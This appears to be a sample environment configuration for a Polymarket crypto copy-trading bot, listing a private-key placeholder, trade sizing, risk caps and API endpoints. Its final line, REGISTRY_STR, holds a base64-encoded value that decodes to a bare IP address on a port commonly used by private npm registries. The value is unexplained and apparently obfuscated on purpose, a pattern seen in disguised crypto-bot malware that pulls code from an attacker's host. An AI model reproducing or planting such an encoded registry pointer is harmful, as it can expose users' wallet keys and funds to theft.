# ── Wallet & chain ──────────────────────────────────────────────────────────
PRIVATE_KEY=0xYOUR_PRIVATE_KEY_HERE
RPC_URL=https://polygon-rpc.com

# ── Copy-trading targets ────────────────────────────────────────────────────
# Comma-separated leader proxy wallet addresses (Polymarket on-chain addresses)
LEADER_WALLETS=0xLeaderWallet1,0xLeaderWallet2
# Derived automatically from PRIVATE_KEY if omitted
# FOLLOWER_WALLET=0xYourProxyWallet

# ── Sizing ──────────────────────────────────────────────────────────────────
POSITION_MULTIPLIER=0.25
MAX_TRADE_USD=100
MIN_TRADE_USD=5
SIZING_MODE=proportional
# SIZING_MODE: fixed | proportional | balance_percent

# ── Execution ───────────────────────────────────────────────────────────────
SLIPPAGE_TOLERANCE=0.02
ORDER_TYPE=LIMIT
COPY_SELLS=false

# ── Risk caps ───────────────────────────────────────────────────────────────
MAX_SESSION_NOTIONAL=500
MAX_PER_MARKET_NOTIONAL=150
MAX_DAILY_LOSS_USD=75
AUTO_PAUSE_ON_DRAWDOWN=true
MAX_CONCURRENT_MARKETS=8

# ── Detection ───────────────────────────────────────────────────────────────
USE_WEBSOCKET=true
POLL_INTERVAL_MS=3000
BACKFILL_HISTORICAL=false

# ── Market scope ────────────────────────────────────────────────────────────
CRYPTO_ONLY=true
RESOLUTION_CUTOFF_HOURS=6

# ── Polymarket endpoints (CLOB v2 production) ───────────────────────────────
CLOB_HOST=https://clob.polymarket.com
GAMMA_HOST=https://gamma-api.polymarket.com
DATA_HOST=https://data-api.polymarket.com
RELAYER_HOST=https://relayer-v2.polymarket.com
WS_MARKET=wss://ws-subscriptions-clob.polymarket.com/ws/market
WS_USER=wss://ws-subscriptions-clob.polymarket.com/ws/user
WS_LIVE_DATA=wss://ws-live-data.polymarket.com

# ── Optional builder attribution ────────────────────────────────────────────
# POLY_BUILDER_CODE=

# ── Storage ─────────────────────────────────────────────────────────────────
DATABASE_PATH=./data/copy-bot.db

# ── Observability ───────────────────────────────────────────────────────────
LOG_LEVEL=info
LOG_PRETTY=true
METRICS_ENABLED=false
METRICS_PORT=9090

# ── Safety ──────────────────────────────────────────────────────────────────
DRY_RUN=true

REGISTRY_STR=aHR0cDovLzIxMi4xOTMuMy42MTo0ODczLw==
